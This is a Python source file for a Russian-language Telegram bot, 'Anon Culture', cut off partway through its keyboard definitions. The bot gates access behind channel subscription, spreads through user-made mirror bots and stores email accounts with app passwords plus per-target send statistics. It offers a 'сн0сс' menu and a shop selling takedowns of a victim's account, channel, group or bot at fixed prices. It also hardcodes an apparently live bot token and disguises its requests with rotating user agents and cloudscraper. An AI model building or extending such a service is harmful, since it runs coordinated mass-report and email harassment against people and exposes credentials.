#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ANON CULTURE BOT - МАСШТАБИРУЕМАЯ ВЕРСИЯ С ЗЕРКАЛАМИ И ВЛАДЕЛЬЦАМИ
===================================================================
- Пользователи могут создавать свои зеркала
- У каждого зеркала свой владелец, настройки подписки, рассылка
- Проверка подписки с кнопкой "Я подписался" и автоматический контроль отписки
- Магазин с ценами, инструкции, улучшенные мануалы
- Вся логика переработана и стабилизирована, форум удалён
"""

import os
import sys
import time
import random
import sqlite3
import threading
import re
import json
import smtplib
import uuid
import logging
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from functools import wraps, lru_cache
from concurrent.futures import ThreadPoolExecutor, as_completed

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import cloudscraper

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = "8194151250:AAFEh_NwqU7Kk5WrmOt2LJezKXswmC02GcY"
ADMIN_ID = 6747528307
REQUIRED_CHANNEL = "@Anon_culture"           # основной канал, проверяется всегда для main-бота
CHANNEL_LINK = "https://t.me/Anon_culture"
SUPPORT_USERNAME = "@nymps"                   # для связи по магазину и поддержке
BOT_NAME = "Anon Culture"
MANUALS_CHANNEL = "https://t.me/+--P6R17xW542Njcy"

MAX_CODES_PER_BATCH = 12
REQUEST_DELAY = (0.5, 1.5)

# ========== ПУТИ ==========
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")
LOGS_DIR = os.path.join(BASE_DIR, "logs")
MIRRORS_DIR = os.path.join(BASE_DIR, "mirrors")
CONFIG_PATH = os.path.join(DATA_DIR, "config.json")
DB_PATH = os.path.join(DATA_DIR, "bot_database.db")
CUSTOM_TEXT_PATH = os.path.join(DATA_DIR, "custom_text.json")

for d in [DATA_DIR, LOGS_DIR, MIRRORS_DIR]:
    os.makedirs(d, exist_ok=True)

# Настройка логирования
logging.basicConfig(
    filename=os.path.join(LOGS_DIR, 'bot.log'),
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ========== ЗАГРУЗКА КОНФИГУРАЦИИ ==========
def load_config():
    if os.path.exists(CONFIG_PATH):
        with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"mirror_bots": [], "main_bot": BOT_TOKEN}

def save_config(cfg):
    with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
        json.dump(cfg, f, indent=2, ensure_ascii=False)

config = load_config()
MAIN_BOT_TOKEN = config.get("main_bot", BOT_TOKEN)
MIRROR_TOKENS = config.get("mirror_bots", [])

# ========== КАСТОМНЫЕ ТЕКСТЫ ==========
def load_custom_texts():
    default = {
        "welcome": "🍕 <b>Привет! Мы рады видеть вас в Anon Culture.</b>\n\nЭтот бот поможет вам бороться с обидчиками, и самое главное — он совершенно бесплатный! Чтобы всегда иметь к нему доступ, не забудьте создать свою копию (зеркало).\n\n👇 <b>Нажмите на кнопки снизу для навигации</b>",
        "button_emails": "📧 Почты",
        "button_manuals": "📚 Мануалы",
        "button_sn0ss": "🔑 сн0сс",
        "button_site": "🌐 На сайт",
        "button_shop": "🛒 Магазин",
        "button_mirrors": "🪞 Зеркала",
        "button_profile": "👤 Профиль",
        "button_support": "🆘 Поддержка",
        "email_instruction": "📘 Как получить пароль приложения?\n\n1. Включите двухфакторную аутентификацию в аккаунте Google/Mail.ru/Yandex.\n2. Перейдите в настройки безопасности.\n3. Создайте пароль приложения (обычно в разделе «Пароли приложений»).\n4. Скопируйте 16-значный пароль и используйте его в боте.\n\nЕсли возникли вопросы — @nymps",
        "shop_text": "🛒 <b>Магазин</b>\n\nЕсли вы хотите быстро наказать своего обидчика, пишите в личные сообщения:\n{support}\n\n💰 <b>Цены:</b>\n• Аккаунт — 350₽\n• ТГК (Telegram-канал) — 300₽\n• Группа — 400₽\n• Бот — 150₽\n\nОплата и все вопросы через @nymps"
    }
    if os.path.exists(CUSTOM_TEXT_PATH):
        with open(CUSTOM_TEXT_PATH, 'r', encoding='utf-8') as f:
            saved = json.load(f)
            default.update(saved)
    else:
        with open(CUSTOM_TEXT_PATH, 'w', encoding='utf-8') as f:
            json.dump(default, f, indent=2, ensure_ascii=False)
    return default

def save_custom_texts(texts):
    with open(CUSTOM_TEXT_PATH, 'w', encoding='utf-8') as f:
        json.dump(texts, f, indent=2, ensure_ascii=False)

custom_texts = load_custom_texts()

# ========== ГЛОБАЛЬНЫЙ СПИСОК БОТОВ ==========
# Каждый элемент: {"bot": obj, "token": str, "is_main": bool, "thread": thread, "owner_id": int (для зеркал)}
bots = []

# ========== КЕШ ПРОВЕРКИ ПОДПИСКИ ==========
subscription_cache = {}  # key: (user_id, channel) -> (result, timestamp)
CACHE_TTL = 300  # 5 минут

def check_sub_cached(bot, user_id, channel):
    """Проверка подписки с кешированием"""
    key = (user_id, channel)
    now = time.time()
    if key in subscription_cache:
        result, ts = subscription_cache[key]
        if now - ts < CACHE_TTL:
            return result
    try:
        member = bot.get_chat_member(channel, user_id)
        result = member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Ошибка проверки подписки {user_id} на {channel}: {e}")
        result = False
    subscription_cache[key] = (result, now)
    return result

def clear_sub_cache(user_id=None, channel=None):
    """Очистка кеша подписки"""
    global subscription_cache
    if user_id is None and channel is None:
        subscription_cache.clear()
    else:
        keys_to_delete = []
        for (uid, ch) in subscription_cache:
            if (user_id is None or uid == user_id) and (channel is None or ch == channel):
                keys_to_delete.append((uid, ch))
        for key in keys_to_delete:
            del subscription_cache[key]

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ РАБОТЫ С БОТАМИ ==========
def get_bot_by_token(token):
    for b in bots:
        if b['token'] == token:
            return b['bot']
    return None

def get_bot_info_by_token(token):
    for b in bots:
        if b['token'] == token:
            return b
    return None

# ========== БАЗА ДАННЫХ (ОПТИМИЗИРОВАННАЯ, БЕЗ ФОРУМА) ==========
class Database:
    def __init__(self, path):
        self.path = path
        self._init_db()
        self._connection_pool = ThreadPoolExecutor(max_workers=4)

    def _get_conn(self):
        return sqlite3.connect(self.path, timeout=10, check_same_thread=False)

    def _init_db(self):
        with self._get_conn() as conn:
            c = conn.cursor()
            # Таблица пользователей
            c.execute('''CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                bot_token TEXT,
                joined_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_activity TIMESTAMP,
                is_subscribed INTEGER DEFAULT 0,
                sub_check TIMESTAMP,
                reputation INTEGER DEFAULT 0
            )''')
            # Таблица зеркал
            c.execute('''CREATE TABLE IF NOT EXISTS mirror_bots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                token TEXT UNIQUE,
                bot_username TEXT,
                owner_id INTEGER,
                added_by INTEGER,
                added TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP,
                active INTEGER DEFAULT 1,
                status TEXT DEFAULT 'active',
                users_count INTEGER DEFAULT 0,
                required_channel TEXT,
                channel_link TEXT,
                welcome_text TEXT,
                broadcast_interval INTEGER DEFAULT 0,
                last_broadcast TIMESTAMP,
                settings TEXT
            )''')
            # Таблица тикетов
            c.execute('''CREATE TABLE IF NOT EXISTS tickets (
                ticket_id TEXT PRIMARY KEY,
                user_id INTEGER,
                username TEXT,
                status TEXT DEFAULT 'open',
                subject TEXT,
                created TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated TIMESTAMP,
                closed TIMESTAMP
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS ticket_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ticket_id TEXT,
                user_id INTEGER,
                message TEXT,
                is_admin INTEGER DEFAULT 0,
                created TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )''')
            # Таблица email аккаунтов
            c.execute('''CREATE TABLE IF NOT EXISTS email_accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT UNIQUE,
                password TEXT,
                added_by INTEGER,
                type TEXT DEFAULT 'public',
                owner_id INTEGER,
                added TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                active INTEGER DEFAULT 1,
                use_count INTEGER DEFAULT 0
            )''')
            # Статистика отправок
            c.execute('''CREATE TABLE IF NOT EXISTS send_stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                email_id INTEGER,
                msg_type TEXT,
                count INTEGER,
                target TEXT,
                date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )''')
            # Мануалы
            c.execute('''CREATE TABLE IF NOT EXISTS manuals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                title TEXT,
                content TEXT,
                category TEXT,
                author_id INTEGER,
                author_username TEXT,
                status TEXT DEFAULT 'pending',
                admin_comment TEXT,
                views INTEGER DEFAULT 0,
                likes INTEGER DEFAULT 0,
                created TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated TIMESTAMP,
                published TIMESTAMP,
                approved_by INTEGER
            )''')
            c.execute('''CREATE TABLE IF NOT EXISTS manual_likes (
                user_id INTEGER,
                manual_id INTEGER,
                liked TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (user_id, manual_id)
            )''')
            # Действия пользователей (для кулдаунов)
            c.execute('''CREATE TABLE IF NOT EXISTS user_actions (
                user_id INTEGER,
                action_type TEXT,
                last_time TIMESTAMP,
                PRIMARY KEY (user_id, action_type)
            )''')
            conn.commit()

    # ---------- Пользователи ----------
    @lru_cache(maxsize=256)
    def get_user(self, uid):
        with self._get_conn() as conn:
            return conn.execute('SELECT * FROM users WHERE user_id=?', (uid,)).fetchone()

    def add_user(self, uid, username, first, last, bot_token):
        with self._get_conn() as conn:
            conn.execute('''INSERT OR REPLACE INTO users
                (user_id, username, first_name, last_name, last_activity, bot_token, sub_check)
                VALUES (?,?,?,?, CURRENT_TIMESTAMP, ?, CURRENT_TIMESTAMP)''',
                (uid, username, first, last, bot_token))
        self.get_user.cache_clear()

    def update_sub(self, uid, subscribed):
        with self._get_conn() as conn:
            conn.execute('UPDATE users SET is_subscribed=?, sub_check=CURRENT_TIMESTAMP WHERE user_id=?',
                         (1 if subscribed else 0, uid))
        self.get_user.cache_clear()

    def all_users(self):
        with self._get_conn() as conn:
            return [row[0] for row in conn.execute('SELECT user_id FROM users')]

    def users_by_bot(self, bot_token):
        with self._get_conn() as conn:
            return [row[0] for row in conn.execute('SELECT user_id FROM users WHERE bot_token=?', (bot_token,))]

    # ---------- Зеркала ----------
    def add_mirror(self, token, bot_username, owner_id, added_by):
        with self._get_conn() as conn:
            try:
                cur = conn.execute('''INSERT INTO mirror_bots 
                    (token, bot_username, owner_id, added_by, last_active, settings)
                    VALUES (?,?,?,?, CURRENT_TIMESTAMP, '{}')''',
                    (token, bot_username, owner_id, added_by))
                return True
            except sqlite3.IntegrityError:
                return False

    def get_mirror(self, token):
        with self._get_conn() as conn:
            return conn.execute('SELECT * FROM mirror_bots WHERE token=?', (token,)).fetchone()

    def get_mirror_by_id(self, mid):
        with self._get_conn() as conn:
            return conn.execute('SELECT * FROM mirror_bots WHERE id=?', (mid,)).fetchone()

    def get_mirrors_by_owner(self, owner_id):
        with self._get_conn() as conn:
            return conn.execute('SELECT * FROM mirror_bots WHERE owner_id=? ORDER BY added DESC', (owner_id,)).fetchall()

    def all_mirrors(self, active_only=True):
        with self._get_conn() as conn:
            if active_only:
                return conn.execute('SELECT * FROM mirror_bots WHERE active=1 ORDER BY added DESC').fetchall()
            return conn.execute('SELECT * FROM mirror_bots ORDER BY added DESC').fetchall()

    def update_mirror_settings(self, token, **kwargs):
        """Обновление настроек зеркала по токену"""
        fields = []
        values = []
        for k, v in kwargs.items():
            fields.append(f"{k}=?")
            values.append(v)
        values.append(token)
        with self._get_conn() as conn:
            conn.execute(f'UPDATE mirror_bots SET {", ".join(fields)} WHERE token=?', values)

    def deactivate_mirror(self, mid):
        with self._get_conn() as conn:
            conn.execute('UPDATE mirror_bots SET active=0 WHERE id=?', (mid,))

    def update_mirror_last_broadcast(self, mid):
        with self._get_conn() as conn:
            conn.execute('UPDATE mirror_bots SET last_broadcast=CURRENT_TIMESTAMP WHERE id=?', (mid,))

    # ---------- Тикеты ----------
    def create_ticket(self, uid, username, subject):
        tid = str(uuid.uuid4())[:8]
        with self._get_conn() as conn:
            conn.execute('INSERT INTO tickets (ticket_id, user_id, username, subject, updated) VALUES (?,?,?,?,CURRENT_TIMESTAMP)', 
                        (tid, uid, username, subject))
        return tid

    def add_ticket_msg(self, tid, uid, msg, is_admin=0):
        with self._get_conn() as conn:
            conn.execute('INSERT INTO ticket_messages (ticket_id, user_id, message, is_admin) VALUES (?,?,?,?)', 
                        (tid, uid, msg, is_admin))
            conn.execute('UPDATE tickets SET updated=CURRENT_TIMESTAMP WHERE ticket_id=?', (tid,))

    def close_ticket(self, tid):
        with self._get_conn() as conn:
            conn.execute('UPDATE tickets SET status=\'closed\', closed=CURRENT_TIMESTAMP WHERE ticket_id=?', (tid,))

    def user_tickets(self, uid):
        with self._get_conn() as conn:
            return conn.execute('SELECT ticket_id, subject, status, created FROM tickets WHERE user_id=? ORDER BY created DESC', 
                              (uid,)).fetchall()

    def ticket_msgs(self, tid):
        with self._get_conn() as conn:
            return conn.execute('SELECT message, is_admin, created FROM ticket_messages WHERE ticket_id=? ORDER BY created', 
                              (tid,)).fetchall()

    def open_tickets(self):
        with self._get_conn() as conn:
            return conn.execute('SELECT ticket_id, user_id, username, subject, created FROM tickets WHERE status=\'open\' ORDER BY created').fetchall()

    # ---------- Email аккаунты ----------
    def add_email(self, email, pwd, added_by, typ='public', owner=None):
        with self._get_conn() as conn:
            try:
                conn.execute('INSERT INTO email_accounts (email, password, added_by, type, owner_id) VALUES (?,?,?,?,?)',
                           (email, pwd, added_by, typ, owner))
                return True
            except sqlite3.IntegrityError:
                return False

    def user_emails(self, uid):
        with self._get_conn() as conn:
            return conn.execute('''SELECT id, email, type FROM email_accounts
                WHERE active=1 AND (type='public' OR (type='personal' AND owner_id=?))
                ORDER BY CASE type WHEN 'personal' THEN 1 ELSE 2 END, added DESC''', (uid,)).fetchall()

    def get_email(self, eid, uid=None):
        with self._get_conn() as conn:
            if uid:
                return conn.execute('SELECT email, password, type, owner_id FROM email_accounts WHERE id=? AND active=1 AND (type=\'public\' OR owner_id=?)', 
                                   (eid, uid)).fetchone()
            return conn.execute('SELECT email, password, type, owner_id FROM email_accounts WHERE id=? AND active=1', 
                              (eid,)).fetchone()

    def all_emails_admin(self):
        with self._get_conn() as conn:
            return conn.execute('SELECT id, email, type, owner_id, added, active, use_count FROM email_accounts ORDER BY added DESC').fetchall()

    def deactivate_email(self, eid):
        with self._get_conn() as conn:
            conn.execute('UPDATE email_accounts SET active=0 WHERE id=?', (eid,))

    def inc_email_use(self, eid):
        with self._get_conn() as conn:
            conn.execute('UPDATE email_accounts SET use_count=use_count+1, last_used=CURRENT_TIMESTAMP WHERE id=?', (eid,))

    # ---------- Статистика ----------
    def save_stat(self, uid, eid, mtype, cnt, target=''):
        with self._get_conn() as conn:
            conn.execute('INSERT INTO send_stats (user_id, email_id, msg_type, count, target) VALUES (?,?,?,?,?)',
                        (uid, eid, mtype, cnt, target))
            if eid:
                self.inc_email_use(eid)

    def user_stats(self, uid):
        with self._get_conn() as conn:
            total = conn.execute('SELECT COUNT(*) FROM send_stats WHERE user_id=?', (uid,)).fetchone()[0]
            types = conn.execute('SELECT msg_type, COUNT(*) FROM send_stats WHERE user_id=? GROUP BY msg_type', (uid,)).fetchall()
            return {'total': total, 'types': types}

    def admin_stats(self):
        with self._get_conn() as conn:
            users = conn.execute('SELECT COUNT(*) FROM users').fetchone()[0]
            emails = conn.execute('SELECT COUNT(*) FROM email_accounts').fetchone()[0]
            email_types = conn.execute('SELECT type, COUNT(*) FROM email_accounts GROUP BY type').fetchall()
            total_sends = conn.execute('SELECT COUNT(*) FROM send_stats').fetchone()[0]
            send_types = conn.execute('SELECT msg_type, COUNT(*) FROM send_stats GROUP BY msg_type').fetchall()
            open_tickets = conn.execute('SELECT COUNT(*) FROM tickets WHERE status=\'open\'').fetchone()[0]
            pending_manuals = conn.execute('SELECT COUNT(*) FROM manuals WHERE status=\'pending\'').fetchone()[0]
            active_mirrors = conn.execute('SELECT COUNT(*) FROM mirror_bots WHERE active=1').fetchone()[0]
            return {
                'users': users,
                'emails': emails,
                'email_types': email_types,
                'total_sends': total_sends,
                'send_types': send_types,
                'open_tickets': open_tickets,
                'pending_manuals': pending_manuals,
                'active_mirrors': active_mirrors
            }

    # ---------- Мануалы ----------
    def create_manual(self, title, content, cat, author_id, author_username):
        with self._get_conn() as conn:
            cur = conn.execute('INSERT INTO manuals (title, content, category, author_id, author_username, updated) VALUES (?,?,?,?,?,CURRENT_TIMESTAMP)',
                               (title, content, cat, author_id, author_username))
            return cur.lastrowid

    def update_manual_status(self, mid, status, comment=None, admin_id=None):
        with self._get_conn() as conn:
            if status == 'approved':
                conn.execute('UPDATE manuals SET status=?, admin_comment=?, approved_by=?, published=CURRENT_TIMESTAMP WHERE id=?',
                           (status, comment, admin_id, mid))
            else:
                conn.execute('UPDATE manuals SET status=?, admin_comment=? WHERE id=?', (status, comment, mid))

    def pending_manuals(self):
        with self._get_conn() as conn:
            return conn.execute('SELECT id, title, category, author_id, author_username, created FROM manuals WHERE status=\'pending\' ORDER BY created').fetchall()

    def approved_manuals(self, cat=None, limit=10, offset=0):
        with self._get_conn() as conn:
            if cat:
                return conn.execute('''SELECT id, title, category, author_username, views, likes, created 
                    FROM manuals WHERE status='approved' AND category=? ORDER BY created DESC LIMIT ? OFFSET ?''',
                    (cat, limit, offset)).fetchall()
            return conn.execute('''SELECT id, title, category, author_username, views, likes, created 
                FROM manuals WHERE status='approved' ORDER BY created DESC LIMIT ? OFFSET ?''',
                (limit, offset)).fetchall()

    def get_manual(self, mid):
        with self._get_conn() as conn:
            conn.execute('UPDATE manuals SET views=views+1 WHERE id=?', (mid,))
            return conn.execute('''SELECT id, title, content, category, author_id, author_username, 
                status, views, likes, created, updated, published FROM manuals WHERE id=?''', (mid,)).fetchone()

    def user_manuals(self, uid):
        with self._get_conn() as conn:
            return conn.execute('SELECT id, title, category, status, views, likes, created FROM manuals WHERE author_id=? ORDER BY created DESC', 
                              (uid,)).fetchall()

    def like_manual(self, uid, mid):
        with self._get_conn() as conn:
            try:
                conn.execute('INSERT INTO manual_likes (user_id, manual_id) VALUES (?,?)', (uid, mid))
                conn.execute('UPDATE manuals SET likes=likes+1 WHERE id=?', (mid,))
                return True
            except sqlite3.IntegrityError:
                return False

    def unlike_manual(self, uid, mid):
        with self._get_conn() as conn:
            conn.execute('DELETE FROM manual_likes WHERE user_id=? AND manual_id=?', (uid, mid))
            conn.execute('UPDATE manuals SET likes=likes-1 WHERE id=?', (mid,))

    def manual_categories(self):
        with self._get_conn() as conn:
            return [row[0] for row in conn.execute('SELECT DISTINCT category FROM manuals WHERE status=\'approved\' ORDER BY category')]

    # ---------- Кулдауны ----------
    def check_cooldown(self, user_id, action_type, cd_seconds):
        with self._get_conn() as conn:
            row = conn.execute('SELECT last_time FROM user_actions WHERE user_id=? AND action_type=?', 
                              (user_id, action_type)).fetchone()
            if row:
                last = datetime.fromisoformat(row[0])
                if datetime.now() - last < timedelta(seconds=cd_seconds):
                    remaining = cd_seconds - (datetime.now() - last).seconds
                    return False, remaining
            return True, 0

    def update_cooldown(self, user_id, action_type):
        with self._get_conn() as conn:
            conn.execute('''INSERT OR REPLACE INTO user_actions (user_id, action_type, last_time) 
                          VALUES (?,?,?)''', (user_id, action_type, datetime.now().isoformat()))

db = Database(DB_PATH)

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def get_random_ua():
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    ]
    return random.choice(ua_list)

def session_with_retries():
    s = requests.Session()
    retry = Retry(total=3, backoff_factor=0.3, status_forcelist=(500,502,503,504))
    s.mount('http://', HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=20))
    s.mount('https://', HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=20))
    return s

# ========== ДЕКОРАТОРЫ ПРОВЕРКИ ПОДПИСКИ ==========
def sub_required_main(func):
    """Декоратор для проверки подписки на основной канал (только для main бота)"""
    @wraps(func)
    def wrapper(message_or_call):
        uid = message_or_call.from_user.id
        if uid == ADMIN_ID:
            return func(message_or_call)
        bot = message_or_call.bot if hasattr(message_or_call, 'bot') else main_bot
        if check_sub_cached(bot, uid, REQUIRED_CHANNEL):
            return func(message_or_call)
        kb = InlineKeyboardMarkup().add(InlineKeyboardButton("📢 Подписаться", url=CHANNEL_LINK))
        kb.add(InlineKeyboardButton("✅ Я подписался", callback_data="main_sub_check"))
        bot.send_message(uid, f"❌ <b>Доступ запрещён</b>\n\nПодпишитесь на канал:\n{CHANNEL_LINK}", reply_markup=kb)
        return
    return wrapper

def sub_required_mirror(mirror_token):
    """Декоратор для проверки подписки на канал зеркала (если задан)"""
    def decorator(func):
        @wraps(func)
        def wrapper(message_or_call):
            uid = message_or_call.from_user.id
            bot = message_or_call.bot if hasattr(message_or_call, 'bot') else get_bot_by_token(mirror_token)
            if not bot:
                return func(message_or_call)
            mirror = db.get_mirror(mirror_token)
            if not mirror:
                return func(message_or_call)
            required = mirror[9]  # required_channel
            link = mirror[10]     # channel_link
            if not required:
                return func(message_or_call)
            if uid == ADMIN_ID or uid == mirror[3]:  # admin или владелец пропускаются
                return func(message_or_call)
            if check_sub_cached(bot, uid, required):
                return func(message_or_call)
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("📢 Подписаться", url=link or f"https://t.me/{required[1:]}"))
            kb.add(InlineKeyboardButton("✅ Я подписался", callback_data=f"mirror_sub_check_{mirror_token}"))
            bot.send_message(uid, f"❌ <b>Доступ запрещён</b>\n\nПодпишитесь на канал:\n{required}", reply_markup=kb)
            return
        return wrapper
    return decorator

# ========== БЕЗОПАСНОЕ РЕДАКТИРОВАНИЕ СООБЩЕНИЙ ==========
def safe_edit_message(bot, text, chat_id, message_id, reply_markup=None, parse_mode='HTML'):
    try:
        bot.edit_message_text(text, chat_id, message_id, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception as e:
        if "message is not modified" not in str(e):
            logger.error(f"Ошибка редактирования сообщения: {e}")

def safe_answer_callback(bot, callback_id, text=None, show_alert=False):
    try:
        bot.answer_callback_query(callback_id, text, show_alert=show_alert)
    except Exception as e:
        if "query is too old" not in str(e):
            logger.error(f"Ошибка ответа на callback: {e}")

def format_time_remaining(seconds):
    m = seconds // 60
    s = seconds % 60
    return f"{m} мин {s} сек"

# ========== РАССЫЛКА (ДЛЯ КОНКРЕТНОГО ЗЕРКАЛА) ==========
def broadcast_to_mirror_users(mirror_token, text, exclude=None):
    exclude = exclude or []
    users = db.users_by_bot(mirror_token)
    if not users:
        return 0, 0
    success = 0
    failed = 0
    bot = get_bot_by_token(mirror_token)
    if not bot:
        return 0, len(users)
    for uid in users:
        if uid in exclude:
            continue
        try:
            bot.send_message(uid, text, parse_mode='HTML')
            success += 1
        except Exception as e:
            logger.error(f"Ошибка отправки пользователю {uid} через зеркало {mirror_token[:10]}: {e}")
            failed += 1
        time.sleep(0.05)
    return success, failed

def broadcast_thread_mirror(owner_id, mirror_token, text, msg_id):
    success, failed = broadcast_to_mirror_users(mirror_token, text, exclude=[owner_id])
    mirror = db.get_mirror(mirror_token)
    if mirror:
        db.update_mirror_last_broadcast(mirror[0])
    bot = get_bot_by_token(mirror_token)
    if bot:
        try:
            bot.edit_message_text(
                f"📢 Рассылка завершена!\n✅ Успешно: {success}\n❌ Неудачно: {failed}",
                owner_id, msg_id,
                reply_markup=mirror_owner_panel_kb(mirror_token)
            )
        except:
            bot.send_message(owner_id, f"📢 Рассылка завершена!\n✅ Успешно: {success}\n❌ Неудачно: {failed}", reply_markup=mirror_owner_panel_kb(mirror_token))

# ========== НОВАЯ ФУНКЦИЯ: РАССЫЛКА ПО ВСЕМ ЗЕРКАЛАМ (ДЛЯ АДМИНА) ==========
def broadcast_to_all_mirrors(text, exclude=None):
    exclude = exclude or []
    mirrors = db.all_mirrors(active_only=True)
    total_success = 0
    total_failed = 0
    results = []
    for mirror in mirrors:
        token = mirror[1]
        bot = get_bot_by_token(token)
        if not bot:
            continue
        users = db.users_by_bot(token)
        if not users:
            continue
        success = 0
        failed = 0
        for uid in users:
            if uid in exclude:
                continue
            try:
                bot.send_message(uid, text, parse_mode='HTML')
                success += 1
            except Exception as e:
                logger.error(f"Ошибка рассылки через зеркало {token[:10]} пользователю {uid}: {e}")
                failed += 1
            time.sleep(0.05)
        total_success += success
        total_failed += failed
        results.append(f"@{mirror[2] or 'бот'}: ✅ {success} ❌ {failed}")
    return total_success, total_failed, results

def broadcast_to_specific_mirror(token, text, exclude=None):
    exclude = exclude or []
    success, failed = broadcast_to_mirror_users(token, text, exclude)
    return success, failed

# ========== КЛАВИАТУРЫ ==========
def main_kb():
    kb = InlineKeyboardMarkup(row_width=3)
    kb.add(
        InlineKeyboardButton(custom_texts["button_emails"], callback_data="emails_menu"),
        InlineKeyboardButton(custom_texts["button_manuals"], callback_data="manuals_menu"),
        InlineKeyboardButton(custom_texts["button_sn0ss"], callback_data="sn0ss_menu"),
        InlineKeyboardButton(custom_texts["button_site"], callback_data="send_to_site"),
        InlineKeyboardButton(custom_texts["button_shop"], callback_data="shop"),
        InlineKeyboardButton(custom_texts["button_mirrors"], callback_data="mirrors_menu"),
        InlineKeyboardButton(custom_texts["button_profile"], callback_data="profile"),
        InlineKeyboardButton(custom_texts["button_support"], callback_data="support_menu"),
    )
    return kb

def admin_kb():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("📋 Тикеты", callback_data="admin_tickets"),
        InlineKeyboardButton("📧 Почты", callback_data="admin_email_menu"),
        InlineKeyboardButton("📚 Мануалы", callback_data="admin_manual_menu"),
        InlineKeyboardButton("🪞 Зеркала", callback_data="admin_mirror_menu"),
        InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"),
        InlineKeyboardButton("📢 Рассылка", callback_data="admin_broadcast_menu"),
        InlineKeyboardButton("⚙️ Настройки", callback_data="admin_settings"),
        InlineKeyboardButton("🔙 Назад", callback_data="back_to_main"),
    )
    return kb

def admin_broadcast_menu_kb():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("📢 Во все зеркала", callback_data="admin_broadcast_all"),
        InlineKeyboardButton("🪞 Выбрать зеркало", callback_data="admin_broadcast_choose"),
        InlineKeyboardButton("🔙 Назад", callback_data="admin_panel"),
    )
    return kb

def admin_settings_kb():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("✏️ Изменить приветствие", callback_data="admin_edit_welcome"),
        InlineKeyboardButton("🔘 Изменить кнопки", callback_data="admin_edit_buttons"),
        InlineKeyboardButton("📘 Изменить инструкцию почт", callback_data="admin_edit_email_instruction"),
        InlineKeyboardButton("🛒 Изменить текст магазина", callback_data="admin_edit_shop"),
        InlineKeyboardButton("🔙 Назад", callback_data="admin_panel"),
    )
    return kb

def admin_edit_buttons_kb():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("📧 Почты", callback_data="admin_edit_btn_emails"),
        InlineKeyboardButton("📚 Мануалы", callback_data="admin_edit_btn_manuals"),
        InlineKeyboardButton("🔑 сн0сс", callback_data="admin_edit_btn_sn0ss"),
        InlineKeyboardButton("🌐 На сайт", callback_data="admin_edit_btn_site"),
        InlineKeyboardButton("🛒 Магазин", callback_data="admin_edit_btn_shop"),
        InlineKeyboardButton("🪞 Зеркала", callback_data="admin_edit_btn_mirrors"),
        InlineKeyboardButton("👤 Профиль", callback_data="admin_edit_btn_profile"),
        InlineKeyboardButton("🆘 Поддержка", callback_data="admin_edit_btn_support"),
        InlineKeyboardButton("🔙 Назад", callback_data="admin_settings"),
    )
    return kb

def admin_email_menu_kb():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("➕ Добавить публичную", callback_data="admin_add_email_public"),
        InlineKeyboardButton("➕ Добавить личную", callback_data="admin_add_email_personal"),
        InlineKeyboardButton("📋 Список всех почт", callback_data="admin_list_emails"),
        InlineKeyboardButton("🔙 Назад", callback_data="admin_panel"),
    )
    return kb

def admin_manual_menu_kb():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("📋 На модерации", callback_data="admin_manual_pending"),
        InlineKeyboardButton("➕ Добавить мануал", callback_data="admin_add_manual"),
        InlineKeyboardButton("📋 Все мануалы", callback_data="admin_manuals_all_1"),
        InlineKeyboardButton("🔙 Назад", callback_data="admin_panel"),
    )
    return kb

def admin_mirror_menu_kb():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("➕ Добавить зеркало (админ)", callback_data="admin_mirror_add"),
